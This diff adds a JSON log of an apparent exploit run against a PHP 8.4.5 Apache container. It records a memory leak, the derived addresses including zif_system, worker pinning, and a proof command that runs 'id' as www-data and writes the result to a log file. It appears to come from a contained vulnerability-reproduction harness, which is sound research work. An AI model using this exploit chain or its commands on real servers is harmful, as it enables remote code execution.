@@ -1,0 +1,151 @@
+{
+ "tag": "PR845B",
+ "build": "8.4.5",
+ "container": "<container>",
+ "port": "<redacted>",
+ "zdtor_off": "0x62c420",
+ "zif_off": "0x43b660",
+ "s_off": "0xed398",
+ "stages": [
+  {
+   "stage": "A1",
+   "rc": 0,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 210,
+   "elapsed": 0.1,
+   "pid": 764,
+   "log": "764 1792978451 POST /index.php 500 - 81344",
+   "stdout": "body=1123451 resp=210 status='HTTP/1.0 500 Internal Server Error'",
+   "stderr": ""
+  },
+  {
+   "stage": "B1",
+   "i": 0,
+   "rc": 0,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 2940760,
+   "elapsed": 0.11,
+   "pid": 764,
+   "log": "764 1792978451 POST /index.php 200 3 51092",
+   "leak": {
+    "encoded": 2940542,
+    "decoded": 2097160,
+    "zdtor": 139850446943264,
+    "zdtor_hits": 1168,
+    "lib": 139850440470528,
+    "heap_fe8": 139850470654016,
+    "main": 139850470653952,
+    "lib_minus_main": -30183424,
+    "pointer_qwords": 8436
+   },
+   "accepted": true
+  },
+  {
+   "stage": "A2",
+   "err": "ok",
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 210,
+   "elapsed": 0.06,
+   "pid": 764,
+   "log": "764 1792978452 POST /index.php 500 - 55557"
+  },
+  {
+   "stage": "B2",
+   "i": 0,
+   "err": "ok",
+   "status": "",
+   "bytes": 0,
+   "elapsed": 0.01,
+   "pid": null,
+   "log": null,
+   "proof_stat": "www-data www-data 33 33 61 644",
+   "proof_text": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nPR845B\n"
+  }
+ ],
+ "success": true,
+ "a1": {
+  "path": "a1_early.bin",
+  "bytes": 1123451,
+  "sha256": "30cb2a107121967741e89bb5b84c34d13d0f7cf3c8af26721998bc213b8fe174"
+ },
+ "b1": {
+  "path": "b1_early.bin",
+  "bytes": 31035467,
+  "sha256": "9edef7cc1a9bff5140135bef0296b7ed7ef356f8362d0bc4f5e5769833d5a7fa"
+ },
+ "env": {
+  "image": "php:8.4.5-apache",
+  "container_id": "0a2e79e18cd3a131cbb90be64f3857c31bd72b4a5ea9f0c4ce626ed4f53322b9",
+  "image_id": "sha256:738c18e2cde813bdcb4f8fe17a57b6084f40d9d4513d7c9daaa259834c15780c",
+  "mounts": [
+   {
+    "src": "<RUNDIR>/work/run/845/conf/000-default-p2s.conf",
+    "dst": "/etc/apache2/sites-enabled/000-default.conf",
+    "rw": false
+   },
+   {
+    "src": "<RUNDIR>/work/run/845/conf/zz-p2s.conf",
+    "dst": "/etc/apache2/conf-enabled/zz-p2s.conf",
+    "rw": false
+   },
+   {
+    "src": "<RUNDIR>/work/run/845/www",
+    "dst": "/var/www/html",
+    "rw": false
+   },
+   {
+    "src": "<RUNDIR>/work/run/845/logs",
+    "dst": "/var/log/apache2",
+    "rw": true
+   },
+   {
+    "src": "<RUNDIR>/work/run/845/conf/php.ini",
+    "dst": "/usr/local/etc/php/php.ini",
+    "rw": false
+   }
+  ],
+  "php": "PHP 8.4.5 (cli) (built: Apr  8 2025 01:16:36) (NTS)",
+  "apache": "Server version: Apache/2.4.62 (Debian)",
+  "mpm": "StartServers            5\nMinSpareServers         5\nMaxSpareServers         10\nMaxRequestWorkers       150\nMaxConnectionsPerChild  0",
+  "php_ini_sha256": "8d6fcbbcff186958a3609e277f8db249122a89d01e8401b1861f5bd4283f148a",
+  "index_sha256": "1b97dc5177b5c4f4a53023a6c72629ce360e466f627d98cdf1d75113450faf23",
+  "index_size": "22",
+  "image_repo_digests": "[\"php@sha256:56a121dbe0a1f2dfd20b24d28408a0ec67c2e480b59a41d4c6c012870984bea6\"]"
+ },
+ "pin": {
+  "parent": 1,
+  "children": 150,
+  "established": 149,
+  "occupiers": 149,
+  "elapsed": 8.91,
+  "accepted": true
+ },
+ "derived": {
+  "main": "0x7f3179a00000",
+  "lib": "0x7f3177d37000",
+  "S": "0x7f3179aed398",
+  "zif_system": "0x7f3178172660",
+  "heap_fe8": "0x7f3179a00040",
+  "lib_minus_main": "-0x1cc9000"
+ },
+ "derived_check": {
+  "heap_is_main_plus_0x40": true,
+  "lib_page_aligned_4k": true,
+  "lib_below_main": true
+ },
+ "a2": {
+  "bytes": 279369,
+  "sha256": "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236",
+  "fillers": 115
+ },
+ "proof_cmd": "id>/var/log/apache2/pwnPR845B;echo PR845B>>/var/log/apache2/pwnPR845B",
+ "proof_path": "/var/log/apache2/pwnPR845B",
+ "b2": {
+  "bytes": 419544,
+  "sha256": "f2cc41ed71477b00592d12ffb391c7cdcc0b4f7b501383a058c3c86ca77a11c7"
+ },
+ "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nPR845B\n",
+ "b2_hit": 0,
+ "proof_stat": "www-data www-data 33 33 61 644",
+ "children_after": 149
+}
